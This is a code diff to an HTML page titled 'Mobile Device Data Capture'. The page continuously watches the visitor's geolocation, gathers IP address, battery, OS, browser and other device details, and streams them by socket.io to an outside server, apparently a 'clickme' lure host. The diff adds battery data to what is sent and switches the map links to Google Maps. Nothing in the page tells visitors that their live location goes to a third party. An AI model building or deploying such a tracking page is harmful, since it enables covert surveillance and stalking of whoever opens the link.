@@ -11,6 +11,30 @@
     <style>
         #map { height: 400px; width: 100%; }
     </style>
+</head>
+<body>
+    <h2>Mobile Device Data Capture</h2>
+    <table border="1">
+        <tr><th>IP Address</th><td id="ipAddress">Loading...</td></tr>
+        <tr><th>Latitude</th><td id="latitude">Loading...</td></tr>
+        <tr><th>Longitude</th><td id="longitude">Loading...</td></tr>
+        <tr><th>Google Maps Link</th><td id="mapsLink">Loading...</td></tr>
+        <tr><th>Screen Resolution</th><td id="screenResolution">Loading...</td></tr>
+        <tr><th>Operating System</th><td id="osVersion">Loading...</td></tr>
+        <tr><th>Browser</th><td id="browser">Loading...</td></tr>
+        <tr><th>Battery Level</th><td id="batteryLevel">Loading...</td></tr>
+        <tr><th>Charging Status</th><td id="chargingStatus">Loading...</td></tr>
+        <tr><th>Touchscreen Support</th><td id="touchSupport">Loading...</td></tr>
+        <tr><th>Screen Orientation</th><td id="orientation">Loading...</td></tr>
+        <tr><th>Language</th><td id="language">Loading...</td></tr>
+        <tr><th>Timezone</th><td id="timezone">Loading...</td></tr>
+        <tr><th>Dark Mode</th><td id="darkMode">Loading...</td></tr>
+        <tr><th>Device Memory</th><td id="deviceMemory">Loading...</td></tr>
+    </table>
+
+    <h3>Live Location:</h3>
+    <div id="map"></div>
+
     <script>
         const socket = io("https://clickme-d5d3.onrender.com/"); // Change to your server URL
         let map, marker;
@@ -55,21 +79,27 @@
                 const battery = await navigator.getBattery();
                 document.getElementById("batteryLevel").textContent = `${Math.round(battery.level * 100)}%`;
                 document.getElementById("chargingStatus").textContent = battery.charging ? "Charging" : "Not Charging";
+                return {
+                    batteryLevel: Math.round(battery.level * 100) + "%",
+                    chargingStatus: battery.charging ? "Charging" : "Not Charging"
+                };
             }
+            return { batteryLevel: "Unknown", chargingStatus: "Unknown" };
         }
 
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition((position) => {
+                navigator.geolocation.watchPosition(async (position) => {
                     const latitude = position.coords.latitude.toFixed(6);
                     const longitude = position.coords.longitude.toFixed(6);
-                    const mapsLink = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}`;
+                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
                     document.getElementById("latitude").textContent = latitude;
                     document.getElementById("longitude").textContent = longitude;
-                    document.getElementById("mapsLink").innerHTML = `<a href="${mapsLink}" target="_blank">View on Map</a>`;
+                    document.getElementById("mapsLink").innerHTML = `<a href="${mapsLink}" target="_blank">View on Google Maps</a>`;
 
-                    sendData(latitude, longitude, mapsLink);
+                    const batteryData = await getBatteryInfo();
+                    sendData(latitude, longitude, mapsLink, batteryData);
                     updateMap(latitude, longitude);
                 }, (error) => {
                     console.error("❌ Location Error:", error);
@@ -79,7 +109,7 @@
             }
         }
 
-        async function sendData(latitude, longitude, mapsLink) {
+        async function sendData(latitude, longitude, mapsLink, batteryData) {
             const ip = await fetchIP();
             const deviceInfo = getDeviceInfo();
             const data = {
@@ -87,7 +117,8 @@
                 latitude,
                 longitude,
                 mapsLink,
-                ...deviceInfo
+                ...deviceInfo,
+                ...batteryData
             };
             console.log("📤 Sending Data:", data);
             socket.emit("deviceData", data);
@@ -108,7 +139,6 @@
 
         window.onload = () => {
             getLocation();
-            getBatteryInfo();
         };
 
         if ('serviceWorker' in navigator) {
@@ -117,28 +147,5 @@
             });
         }
     </script>
-</head>
-<body>
-    <h2>Mobile Device Data Capture</h2>
-    <table border="1">
-        <tr><th>IP Address</th><td id="ipAddress">Loading...</td></tr>
-        <tr><th>Latitude</th><td id="latitude">Loading...</td></tr>
-        <tr><th>Longitude</th><td id="longitude">Loading...</td></tr>
-        <tr><th>OpenStreetMap</th><td id="mapsLink">Loading...</td></tr>
-        <tr><th>Screen Resolution</th><td id="screenResolution">Loading...</td></tr>
-        <tr><th>Operating System</th><td id="osVersion">Loading...</td></tr>
-        <tr><th>Browser</th><td id="browser">Loading...</td></tr>
-        <tr><th>Battery Level</th><td id="batteryLevel">Loading...</td></tr>
-        <tr><th>Charging Status</th><td id="chargingStatus">Loading...</td></tr>
-        <tr><th>Touchscreen Support</th><td id="touchSupport">Loading...</td></tr>
-        <tr><th>Screen Orientation</th><td id="orientation">Loading...</td></tr>
-        <tr><th>Language</th><td id="language">Loading...</td></tr>
-        <tr><th>Timezone</th><td id="timezone">Loading...</td></tr>
-        <tr><th>Dark Mode</th><td id="darkMode">Loading...</td></tr>
-        <tr><th>Device Memory</th><td id="deviceMemory">Loading...</td></tr>
-    </table>
-
-    <h3>Live Location:</h3>
-    <div id="map"></div>
 </body>
 </html>
